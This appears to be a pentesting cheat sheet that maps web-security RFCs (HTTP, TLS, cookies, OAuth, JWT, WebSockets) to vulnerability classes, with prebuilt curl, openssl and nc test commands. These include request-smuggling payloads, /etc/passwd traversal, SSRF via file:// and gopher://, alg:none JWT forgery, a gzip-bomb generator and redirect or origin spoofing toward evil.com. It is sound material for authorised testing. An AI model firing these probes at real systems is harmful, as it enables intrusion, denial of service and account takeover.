# Web Security RFC Reference

Complete RFC reference for web security testing. Each entry maps the RFC to specific pentesting techniques and includes pre-built curl/openssl test commands.

---

## HTTP Semantics & Transport

### RFC 9110 — HTTP Semantics (2022)
*Obsoletes: RFC 2818, 7230, 7231, 7232, 7233, 7234, 7235, 7538, 7615, 7694*

**Key Security Sections:**
- Section 4 — Message format (CRLF injection surface, whitespace smuggling)
- Section 7 — Methods: GET, POST, PUT, DELETE, HEAD, OPTIONS, TRACE, CONNECT, PATCH
- Section 9 — Headers: Host, Content-Type, Content-Length, Transfer-Encoding, TE
- Section 10 — Status codes: 400–599 (information leakage, verbose errors)
- Section 12 — Authentication: WWW-Authenticate, Authorization, Proxy-Authenticate
- Section 15.5 — CRLF injection in headers
- Section 15.8 — Request smuggling via Content-Length / Transfer-Encoding ambiguity
- Section 17 — Security considerations summary

**Vulnerabilities:** HTTP Request Smuggling, Header Injection, Verb Tampering, TRACE XSS, Method Override, Host Header Injection

**Test Commands:**
```bash
# TRACE method check (XST)
curl -X TRACE -v TARGET_URL 2>&1 | grep -i 'TRACE\|echo'

# Method override via header
curl -X GET -H 'X-HTTP-Method-Override: DELETE' TARGET_URL/api/resource

# Header injection via CRLF
curl -s -H "X-Custom: test%0d%0aInjected: true" TARGET_URL -I

# Verb tampering bypass auth
curl -X OPTIONS TARGET_URL/admin -I
curl -X HEAD TARGET_URL/admin -I
curl -X PATCH TARGET_URL/admin -I
```

### RFC 9112 — HTTP/1.1 (2022)
*Obsoletes: RFC 7230*

**Key Security Sections:**
- Section 3 — Message parsing (request-line injection, whitespace behavior)
- Section 5 — Connection management (Keep-Alive reuse across clients)
- Section 6 — Transfer codings (chunked encoding, TE.CL smuggling)
- Section 7 — Host header handling
- Section 9.3 — Message body length determination
- Section 10 — Security: request smuggling, response splitting
- Section 11 — Implementation differences (parsing tolerance)

**Vulnerabilities:** CL.TE Smuggling, TE.CL Smuggling, TE.TE Smuggling, Response Splitting, Host Poisoning, HTTP/0.9 smuggling

**Test Commands:**
```bash
# CL.TE smuggling probe
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG' | nc -w3 TARGET 80

# TE.CL smuggling probe
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nHost: TARGET\r\n\r\n0\r\n\r\n' | nc -w3 TARGET 80

# Host header poisoning (multiple Hosts)
curl -s -H 'Host: evil.com' -H 'Host: TARGET' TARGET_URL -I

# Absolute URI in request line (front-end rewrite bypass)
curl -s --request-target 'http://evil.com/' TARGET_URL -I

# HTTP/0.9 fallback (no headers)
printf 'GET /\r\n' | nc -w3 TARGET 80
```

### RFC 9113 — HTTP/2 (2022)
*Obsoletes: RFC 7540*

**Key Security Sections:**
- Section 3 — Frame format
- Section 4 — Stream states and identifiers
- Section 5 — Flow control
- Section 7 — HPACK header compression
- Section 8 — HTTP/2 connection preface (settings exchange)
- Section 10 — Security: downgrade attacks, padding oracle
- Section 10.5 — Denial of service (stream exhaustion, SETTINGS flood)

**Vulnerabilities:** H2.CL Smuggling, H2.TE Smuggling, HPACK Bomb (compression bomb), Stream Multiplexing Abuse, Via Header Injection on Downgrade, Pseudo-Header Injection

**Test Commands:**
```bash
# H2 downgrade smuggling (when frontend uses H2, backend HTTP/1.1)
curl --http2 -H 'Content-Length: 0' -H 'Transfer-Encoding: chunked' TARGET_URL -v

# Pseudo-header injection
curl --http2 -H ':method: POST' TARGET_URL -v 2>&1

# HPACK compression bomb - large header
curl --http2 -H "X-Bomb: $(python3 -c 'print('A'*16000)')" TARGET_URL -H 'Connection: close'
```

### RFC 9114 — HTTP/3 (2022)
*QUIC-based HTTP*

**Key Security Sections:**
- Section 2 — Connection setup and QUIC streams
- Section 4 — HTTP request/response over QUIC
- Section 7 — Connection migration
- Section 9 — Server push cancellation
- Section 10 — 0-RTT replay attacks
- Section 10.3 — Amplification attacks

**Vulnerabilities:** 0-RTT Replay (replay POST requests), Connection Migration Hijack, QUIC Version Downgrade

**Test Commands:**
```bash
# Check HTTP/3 support
curl --http3 -v TARGET_URL 2>&1 | grep -i 'h3\|quic\|alt-svc'

# 0-RTT probe
curl --http3 --early-data -d 'replay=test' TARGET_URL/api/action -v
```

---

## TLS & Transport Security

### RFC 8446 — TLS 1.3 (2018)
*Obsoletes: RFC 5246 (TLS 1.2)*

**Key Security Sections:**
- Section 2 — Protocol overview
- Section 4.2.8 — Key Share (forward secrecy)
- Section 4.2.11 — Pre-Shared Key Extension (0-RTT)
- Section 4.4.2.1 — Encrypted Extensions
- Section 5 — Record protocol
- Section 7 — Cryptographic computations
- Appendix C — 0-RTT security properties (anti-replay)
- Appendix D — No static RSA/DH key exchange (mandates forward secrecy)
- Section C.4 — Replay attacks on 0-RTT data

**Vulnerabilities:** SSL/TLS Downgrade, 0-RTT Replay, Missing Forward Secrecy, Weak Cipher Suites, Certificate Validation Bypass

**Test Commands:**
```bash
# TLS version enumeration
openssl s_client -connect TARGET:443 -tls1_2 </dev/null 2>&1 | grep 'Protocol'
openssl s_client -connect TARGET:443 -tls1_3 </dev/null 2>&1 | grep 'Protocol'

# Cipher suite check (look for weak ciphers: NULL, EXPORT, DES, RC4, anon)
nmap --script ssl-enum-ciphers -p 443 TARGET

# Certificate inspection
openssl s_client -connect TARGET:443 -servername TARGET </dev/null 2>/dev/null | openssl x509 -text -noout

# Check for SSLv2/SSLv3 support (POODLE)
openssl s_client -connect TARGET:443 -ssl2 </dev/null 2>&1
openssl s_client -connect TARGET:443 -ssl3 </dev/null 2>&1

# TLS curve check
nmap --script ssl-curves -p 443 TARGET

# Check if TLS 1.3 0-RTT enabled
openssl s_client -connect TARGET:443 -tls1_3 -early_data </dev/null 2>&1
```

### RFC 8996 — Deprecating TLS 1.0 and TLS 1.1 (2021)
**Test Commands:**
```bash
openssl s_client -connect TARGET:443 -tls1 </dev/null 2>&1 | grep -E 'Protocol|failure'
openssl s_client -connect TARGET:443 -tls1_1 </dev/null 2>&1 | grep -E 'Protocol|failure'
```

---

## URI & Web Identity

### RFC 3986 — URI Generic Syntax (2005)
*Updated by: RFC 6874, 7320, 8820*

**Key Security Sections:**
- Section 2 — Characters (percent-encoding, reserved, unreserved)
- Section 3.2.2 — Host (IP-literal, IPv6 bracket notation, reg-name)
- Section 3.3 — Path (path traversal: `../`, `..;`, `..%2f`, `%2e%2e/`)
- Section 3.4 — Query (parameter injection, delimiter confusion)
- Section 3.5 — Fragment (client-side only, not sent to server)
- Section 6 — Normalization and comparison
- Section 7.6 — Back-end transcoding (ambiguous sequences)

**Vulnerabilities:** Path Traversal, SSRF via URI parsing, Open Redirect, Parameter Pollution, URL Filter Bypass (encoding tricks), Double Encoding, CRLF in Query String

**Test Commands:**
```bash
# Path traversal via encoding variants
curl -s --path-as-is 'TARGET_URL/..%2f..%2f..%2fetc/passwd'
curl -s --path-as-is 'TARGET_URL/..%252f..%252f..%252fetc/passwd'
curl -s --path-as-is 'TARGET_URL/..;/..;/..;/etc/passwd'

# SSRF via unusual URI schemes
curl -s 'TARGET_URL/proxy?url=file:///etc/passwd'
curl -s 'TARGET_URL/proxy?url=gopher://internal:8080/_GET%20/'

# Open redirect via URL confusion
curl -sI "TARGET_URL/redirect?url=//evil.com"
curl -sI "TARGET_URL/redirect?url=\\evil.com"
curl -sI "TARGET_URL/redirect?url=https:evil.com"

# Fragment (hash) parameter pollution
curl -s 'TARGET_URL/api?user=admin%23&role=user'
```

### RFC 6454 — The Web Origin Concept (2011)

**Key Security Sections:**
- Section 3 — Origin definition (scheme, host, port triple)
- Section 4 — Serializing origins
- Section 5 — Comparing origins (same-origin determination)
- Section 7 — Origin in user-agent policies (document.domain relaxation, postMessage)

**Vulnerabilities:** CORS Misconfiguration, postMessage Origin Spoofing, SOP Bypass via document.domain, WebSocket Origin Bypass

**Test Commands:**
```bash
# WebSocket origin spoofing
printf 'GET / HTTP/1.1\r\nHost: TARGET\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\nOrigin: https://evil.com\r\n\r\n' | nc -w3 TARGET 80

# CORS origin reflection
curl -s -I -H 'Origin: https://evil.com' TARGET_URL/api/endpoint | grep -i 'access-control'
```

### RFC 7034 — HTTP Header Field X-Frame-Options (2013)

DENY, SAMEORIGIN, ALLOW-FROM uri

**Vulnerabilities:** Clickjacking, Frame Injection

**Test Commands:**
```bash
# Check X-Frame-Options
curl -sI TARGET_URL | grep -i 'x-frame-options'
# Missing? Check CSP frame-ancestors as fallback
curl -sI TARGET_URL | grep -i 'content-security-policy' | grep -o 'frame-ancestors[^;]*'
```

---

## Cookies & Session State

### RFC 6265 — HTTP State Management Mechanism (2011)
*Updated by: RFC 6265bis (draft-ietf-httpbis-rfc6265bis)*

**Key Security Sections:**
- Section 4.1 — Set-Cookie header attributes
- Section 4.1.2.5 — Domain attribute (subdomain scope)
- Section 4.1.2.6 — Secure attribute (HTTPS-only)
- Section 4.1.2.7 — HttpOnly attribute (no JavaScript access)
- Section 5.3 — Storage model (domain matching, TLD behavior)
- Section 8 — Security considerations
- Section 8.1 — Cookie scoping (domain attribute dangers)
- Section 8.3 — Weak isolation (subdomain cookie override)

**Vulnerabilities:** Session Hijacking, XSS → Cookie Theft (missing HttpOnly), Cookie Tossing (subdomain cookie injection), Cookie Fixation, Domain/Path Manipulation

**Test Commands:**
```bash
# Cookie attribute audit
curl -sI TARGET_URL | grep -i 'set-cookie'

# Cookie fixation check (accept user-supplied session)
curl -s -H 'Cookie: session=fixed12345' TARGET_URL/login -d 'user=victim&pass=test' -v 2>&1 | grep -i 'set-cookie'

# Cookie tossing / subdomain injection
curl -sI TARGET_URL -H 'Cookie: session=evil_token; Domain=.TARGET; Path=/'
```

### RFC 6265bis — Cookies: HTTP State Management Mechanism (draft)
*Replaces: RFC 6265*

**Key Security Sections:**
- Section 4 — SameSite attribute (Strict, Lax, None)
- Section 5 — Cookie prefixes: `__Secure-` and `__Host-`
- Section 8 — SameSite Lax default behavior

**Vulnerabilities:** SameSite Bypass (Lax → top-level navigation GET), CSRF without SameSite

**Test Commands:**
```bash
# SameSite analysis
curl -sI TARGET_URL | grep -i 'set-cookie' | grep -o 'SameSite=[^;]*'

# Test Lax bypass via GET + top-level navigation
curl -s 'TARGET_URL/transfer?amount=1000&to=attacker' -H 'Cookie: session=xxx; SameSite=Lax'
```

### RFC 6266 — Content-Disposition (2011)

**Key Security Sections:**
- Section 4 — Header field definition (filename, filename*)
- Section 4.3 — Disposition type: inline vs attachment
- Section 5 — Character encoding and language

**Vulnerabilities:** MIME Sniffing, File Download Injection, XSS via inline Content-Type

---

## Authentication & Tokens

### RFC 7617 — HTTP Basic Authentication (2015)
*Obsoletes: RFC 2617*

**Vulnerabilities:** Credentials in cleartext (when not HTTPS), Base64 replay

**Test Commands:**
```bash
# Basic auth check
curl -sI TARGET_URL | grep -i 'www-authenticate'

# Decode captured Basic auth
echo 'YWRtaW46cGFzc3dvcmQ=' | base64 -d

# Test credential replay across endpoints
curl -s -u 'admin:password' TARGET_URL/admin -I
```

### RFC 6750 — OAuth 2.0 Bearer Token Usage (2012)

**Key Security Sections:**
- Section 2.1 — Authorization request header field
- Section 2.2 — Form-encoded body parameter
- Section 2.3 — URI query parameter (LIKELY TO LEAK)
- Section 3 — Security considerations
- Section 3.4 — Token replay prevention

**Vulnerabilities:** Token in URL (logged, leaked via Referer), Missing Token Binding, Token Leakage via Referer Header, Bearer Token Replay

**Test Commands:**
```bash
# Bearer token submission methods
curl -s -H 'Authorization: Bearer TOKEN' TARGET_URL/api/user
curl -s 'TARGET_URL/api/user?access_token=TOKEN'

# Referer leakage check (token in URL → leaked to third-party)
curl -s -H 'Referer: https://evil.com/logger' TARGET_URL/legit-page
```

### RFC 6749 — OAuth 2.0 Authorization Framework (2012)
*Updated by: RFC 8252*

**Key Security Sections:**
- Section 2 — Roles (client, resource owner, authorization server, resource server)
- Section 3.1 — Authorization endpoint
- Section 4.1 — Authorization Code Grant
- Section 4.2 — Implicit Grant (DEPRECATED)
- Section 4.3 — Resource Owner Password Credentials Grant (DEPRECATED)
- Section 4.4 — Client Credentials Grant
- Section 6 — Refreshing an access token
- Section 10 — Security considerations
- Section 10.3 — Access Token (bearer tokens)
- Section 10.4 — Refresh Tokens
- Section 10.5 — Authorization Codes (one-time-use, binding to client)
- Section 10.6 — Client Authentication (redirect_uri validation)
- Section 10.12 — Redirect URI validation
- Section 10.15 — Implicit grant risks (access token in fragment + history)

**Vulnerabilities:** Open Redirect in authorize, CSRF (state parameter missing), Redirect URI Lax Matching, Token Leakage, Client Secret in Frontend, Authorization Code Reuse, PKCE Missing, Implicit Flow Token in URL Fragment

**Test Commands:**
```bash
# OAuth authorize endpoint probes
curl -sI "TARGET_URL/oauth/authorize?client_id=CLIENT&redirect_uri=https://evil.com/callback&response_type=code&scope=openid"

# Redirect URI bypass (path traversal in URI)
curl -sI "TARGET_URL/oauth/authorize?client_id=CLIENT&redirect_uri=https://TARGET/callback/../../evil.com/hijack&response_type=code"

# CSRF — no state parameter
curl -sI "TARGET_URL/oauth/authorize?client_id=CLIENT&redirect_uri=https://CLIENT/callback&response_type=code"

# PKCE missing check
curl -s -d 'grant_type=authorization_code&code=CODE&redirect_uri=https://CLIENT/callback&client_id=CLIENT' TARGET_URL/oauth/token

# Authorization code replay
curl -s -d 'grant_type=authorization_code&code=USED_CODE&redirect_uri=https://CLIENT/callback&client_id=CLIENT&code_verifier=XXX' TARGET_URL/oauth/token
```

### RFC 7636 — PKCE (Proof Key for Code Exchange) (2015)

**Test Commands:**
```bash
# No PKCE enforcement
curl -s -d 'grant_type=authorization_code&code=CODE&redirect_uri=https://CLIENT/callback&client_id=CLIENT' TARGET_URL/oauth/token
```

---

## JSON Web Tokens (JWT)

### RFC 7515 — JSON Web Signature (JWS) (2015)

**Key Security Sections:**
- Section 3 — JWS serialization
- Section 4 — JWS compact serialization (header.payload.signature)
- Section 5 — Cryptographic algorithms (`alg`)
- Section 5.2.1 — HMAC with SHA-256 (HS256)
- Section 5.2.2 — RSASSA-PKCS1-v1_5 (RS256)
- Appendix C.1 — Accepting `alg: none` (CRITICAL)

**Vulnerabilities:** Algorithm Confusion (RS256 → HS256 via public key), `alg: none` Attack, Key ID Injection (kid → path traversal), JWK Inline Injection (jwk header), Symmetric Key = Public Key

**Test Commands:**
```bash
# alg: none attack
# 1. Decode JWT header, change "alg":"RS256" → "alg":"none", remove signature
echo 'JWT_TOKEN' | cut -d. -f1 | base64 -d 2>/dev/null | jq '.alg = "none"' | base64 | tr -d '=\n' | tr '/+' '_-'

# Check kid parameter for path traversal
echo 'JWT_TOKEN' | cut -d. -f1 | base64 -d 2>/dev/null | jq '.kid'

# Full JWT decode
echo 'JWT_TOKEN' | cut -d. -f1,2 | while IFS='.' read -r h p; do
  echo "$h" | base64 -d 2>/dev/null | jq .
  echo "$p" | base64 -d 2>/dev/null | jq .
done
```

### RFC 7519 — JSON Web Token (JWT) (2015)

**Key Security Sections:**
- Section 4 — JWT claims
- Section 4.1 — Registered claim names
- Section 4.1.1 — `iss` (Issuer; check for issuer confusion)
- Section 4.1.2 — `sub` (Subject; horizontal privilege escalation target)
- Section 4.1.3 — `aud` (Audience; token replay across services)
- Section 4.1.4 — `exp` (Expiration; test expired token acceptance)
- Section 4.1.5 — `nbf` (Not Before)
- Section 4.1.6 — `iat` (Issued At)
- Section 4.1.7 — `jti` (JWT ID; MUST be unique, replay protection)

**Vulnerabilities:** JWT None Algorithm, Key Confusion, kid Injection, Expired Token Acceptance, Token Replay (missing jti), Audience Confusion, Issuer Confusion, Missing Signature Validation, Weak HMAC Secret, JWK Injection

**Test Commands:**
```bash
# Test expired token acceptance
curl -s -H 'Authorization: Bearer EXPIRED_JWT' TARGET_URL/api/resource

# Horizontal privilege escalation (change sub)
JWT_DECODED=$(echo 'JWT' | cut -d. -f2 | base64 -d 2>/dev/null)
echo "$JWT_DECODED" | jq '.sub = "admin"'

# Audience confusion (token issued for service A used on service B)
curl -s -H 'Authorization: Bearer SERVICE_A_JWT' TARGET_URL_SERVICE_B/api/

# Token replay (no jti enforcement)
curl -s -H 'Authorization: Bearer CAPTURED_TOKEN' TARGET_URL/api/sensitive

# Weak HMAC secret brute-force hint
hashcat -m 16500 -a 0 jwt_hash.txt /usr/share/wordlists/rockyou.txt 2>/dev/null
```

### RFC 7517 — JSON Web Key (JWK) (2015)

**Test Commands:**
```bash
# JWK injection in JWT header
echo '{"alg":"RS256","jwk":{"kty":"RSA","n":"ATTACKER_N","e":"AQAB"}}' | base64 | tr -d '=\n' | tr '/+' '_-'
```

---

## Security Headers

### RFC 6797 — HTTP Strict Transport Security (HSTS) (2012)

**Key Security Sections:**
- Section 6.1 — max-age directive
- Section 6.2 — includeSubDomains (cookies leaking to HTTP subdomains)
- Section 8.1 — max-age=0 (opt-out from HSTS)
- Section 10 — Cookie-hijacking via SSLstrip
- Section 14.6 — Supercookies (HSTS tracking via 32-bit values)

**Vulnerabilities:** SSLstrip (when HSTS missing), HSTS Tracking/Supercookie, Cookie Leak to HTTP Subdomain (no includeSubDomains), max-age=0 from server (HSTS opt-out attack)

**Test Commands:**
```bash
# Check HSTS header
curl -sI TARGET_URL | grep -i 'strict-transport-security'

# Check for includeSubDomains
curl -sI TARGET_URL | grep -i 'strict-transport-security.*includeSubDomains'

# HTTP redirect to HTTPS
curl -sI "http://TARGET/" -L | grep -E 'HTTP/|Location|strict-transport'

# HSTS supercookie detection (ID via max-age variations)
for age in 0 1 2 4 8; do
  curl -sI "TARGET_URL" -H "X-HSTS-Tracker: $age" | grep -i 'strict-transport'
done
```

### RFC 8297 — Early Hints (103) (2017)

**Vulnerabilities:** Early Hint Injection (inject Link headers before CSP), Resource Preload via Link header Hijack

---

## Web Linking & Discovery

### RFC 8288 — Web Linking (2017)
*Obsoletes: RFC 5988*

**Key Security Sections:**
- Section 2 — Link header field
- Section 2.2.2 — Relation types (preconnect, preload, stylesheet)
- Section 4 — Security considerations

**Vulnerabilities:** Link Header Injection, DNS Prefetch via Link, Preconnect to Attacker Server

**Test Commands:**
```bash
# Link header inspection
curl -sI TARGET_URL | grep -i 'link'

# DNS prefetch poisoning
curl -sI -H 'Link: <https://evil.com>; rel=preconnect' TARGET_URL
```

### RFC 5785 — /.well-known/ URIs (2010)

**Test Commands:**
```bash
# Enumerate /.well-known/ endpoints
curl -s TARGET_URL/.well-known/security.txt
curl -s TARGET_URL/.well-known/openid-configuration
curl -s TARGET_URL/.well-known/oauth-authorization-server
curl -s TARGET_URL/.well-known/assetlinks.json
curl -s TARGET_URL/.well-known/apple-app-site-association
curl -s TARGET_URL/.well-known/change-password
curl -s TARGET_URL/.well-known/jwks.json
curl -s TARGET_URL/.well-known/ai-plugin.json
curl -s TARGET_URL/.well-known/nostr.json
curl -s TARGET_URL/.well-known/matrix/server
curl -s TARGET_URL/.well-known/atproto-did
```

### RFC 8615 — Well-Known Uniform Resource Identifiers (URIs) (2019)
*Updates: RFC 5785*

---

## WebSockets

### RFC 6455 — The WebSocket Protocol (2011)

**Key Security Sections:**
- Section 1.6 — Security model
- Section 4 — Opening handshake (Origin check, Sec-WebSocket-Key)
- Section 5.8 — Close frame control
- Section 10.1 — Frame masking (client → server, prevents cache poisoning)
- Section 10.3 — Attacks on infrastructure (transparent proxies)
- Section 10.6 — Origin-based security model (relies on Origin header)

**Vulnerabilities:** WebSocket CSRF (missing Origin check), WebSocket XSS, WebSocket SQLi, WebSocket SSRF, Unmasked Server Frames, Cross-Site WebSocket Hijacking (CSWSH)

**Test Commands:**
```bash
# WebSocket CSRF / missing Origin check
printf 'GET /ws HTTP/1.1\r\nHost: TARGET\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\nOrigin: https://evil.com\r\nCookie: session=TOKEN\r\n\r\n' | nc -w5 TARGET 443 2>&1 | head -20

# Same-Origin websocket connect
python3 -c "
import websocket
ws = websocket.create_connection('wss://TARGET/ws', origin='https://evil.com')
ws.send('{\"action\":\"sensitive\"}')
print(ws.recv())
ws.close()
" 2>/dev/null

# WebSocket downgrade attempt (HTTP 101 not received)
curl -sI -H 'Upgrade: websocket' -H 'Connection: Upgrade' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' -H 'Sec-WebSocket-Version: 13' TARGET_URL/socket
```

---

## Content Encoding & Transfer

### RFC 8188 — Encrypted Content-Encoding for HTTP (2017)

**Vulnerabilities:** Content-Encoding Confusion, Content-Encoding Overflow, Gzip Bomb (Decompression DoS)

**Test Commands:**
```bash
# Gzip bomb via Content-Encoding
python3 -c "
import zlib, sys
bomb = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff'
sys.stdout.buffer.write(bomb + zlib.compress(b'A' * 1000000))
" > gzip_bomb.gz
curl -s -H 'Content-Encoding: gzip' --data-binary @gzip_bomb.gz TARGET_URL -v

# Content-Encoding confusion (gzip vs deflate vs br vs zstd)
curl -s -H 'Content-Encoding: none' -H 'Content-Encoding: gzip' TARGET_URL/upload
```

### RFC 8470 — Using Early Data in HTTP (2018)

0-RTT HTTP requests (GET must be idempotent, POST is replayable)

**Vulnerabilities:** HTTP 0-RTT POST Replay, Early Data Injection

---

## Federation & SSO

### RFC 7521 — Assertion Framework for OAuth 2.0 Client Authentication and Authorization Grants (2015)

**Key Security Sections:**
- Section 3 — Assertion framework
- Section 5 — Security considerations
- Section 5.1 — Assertion replay via token endpoint
- Section 5.2 — Assertion expiration

**Vulnerabilities:** SAML Assertion Replay, SAML Signature Wrapping, XML Signature Exclusion, XML Entity Expansion (XXE/Billion Laughs)

---

## Additional Security-Relevant RFCs

### RFC 7522 — SAML 2.0 Profile for OAuth 2.0 (2015)
### RFC 7523 — JWT Profile for OAuth 2.0 Client Authentication (2015)
### RFC 8252 — OAuth 2.0 for Native Apps (2017)
*PKCE required, loopback redirect, app-claimed HTTPS URI*

### RFC 8414 — OAuth 2.0 Authorization Server Metadata (2018)
**Test:**
```bash
curl -s TARGET_URL/.well-known/oauth-authorization-server
```

### RFC 8628 — OAuth 2.0 Device Authorization Grant (2019)
*Device flow — user code brute-force risk*

### RFC 9200 — OAuth 2.0 Rich Authorization Requests (2022)

### RFC 6960 — OCSP (Online Certificate Status Protocol) (2013)
### RFC 8555 — ACME (Automatic Certificate Management Environment) (2019)

### RFC 8942 — HTTP Client Hints (2021)
*Fingerprinting via Sec-CH-UA-* headers*

**Test Commands:**
```bash
# Client hints leak detection
curl -s -H 'Sec-CH-UA: "Not A;Brand";v="99"' TARGET_URL -I

# Accept-CH check
curl -sI TARGET_URL | grep -i 'accept-ch'
```

---

## Quick Reference: RFC → Vulnerability Mapping

| RFC | Key Vulnerabilities |
|-----|---------------------|
| RFC 9110 | Smuggling, Header Injection, Verb Tampering |
| RFC 9112 | CL.TE / TE.CL Smuggling, Response Splitting, HTTP/0.9 |
| RFC 9113 | H2 Smuggling, HPACK Bomb, Stream Exhaustion |
| RFC 8446 | Downgrade, 0-RTT Replay, Weak Ciphers |
| RFC 6265 | Session Hijacking, Cookie Fixation, Cookie Tossing |
| RFC 6265bis | SameSite Bypass, CSRF |
| RFC 6749 | Open Redirect, CSRF, Token Leakage, Redirect URI Bypass |
| RFC 7519 | alg:none, Key Confusion, kid Injection, Token Replay |
| RFC 7515 | Algorithm Confusion, JWK Injection |
| RFC 6454 | CORS, postMessage, SOP Bypass |
| RFC 6455 | WebSocket CSRF, CSWSH, Origin Bypass |
| RFC 3986 | Path Traversal, SSRF, Open Redirect, Encoding Bypass |
| RFC 6797 | SSLstrip, HSTS Supercookie, Cookie Leak |
| RFC 8288 | Link Header Injection, DNS Prefetch Poisoning |
| RFC 8297 | Early Hint Injection |
| RFC 8470 | 0-RTT POST Replay |
| RFC 8615 | Well-Known Enumeration |
| RFC 8942 | Client Hint Fingerprinting |
| RFC 7521 | SAML Assertion Replay, Signature Wrapping |